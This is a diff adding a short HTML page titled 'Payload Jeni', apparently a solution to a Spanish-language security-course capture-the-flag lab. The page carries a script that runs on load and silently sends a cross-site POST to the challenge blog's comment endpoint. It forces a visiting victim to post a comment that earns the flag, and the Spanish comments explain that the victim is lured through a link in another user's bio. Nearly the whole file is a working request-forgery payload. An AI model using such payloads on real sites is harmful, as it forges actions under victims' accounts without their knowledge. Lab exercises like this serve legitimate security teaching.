@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Payload Jeni</title>
+</head>
+<body>
+    <script>
+        // Cuando Jeni entre a la biografía de Pepe (que apuntará a tu URL de Vercel),
+        // este script se ejecutará automáticamente y la obligará a dejar el comentario.
+        fetch('https://chl-4afcc8bc-7a5d-4a22-94c3-a9627c3767e1-blog-hacklab-v2.softwareseguro.com.ar/comment', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: 'content=Jeni_estuvo_aqui_dame_la_flag'
+        });
+    </script>
+</body>
+</html>
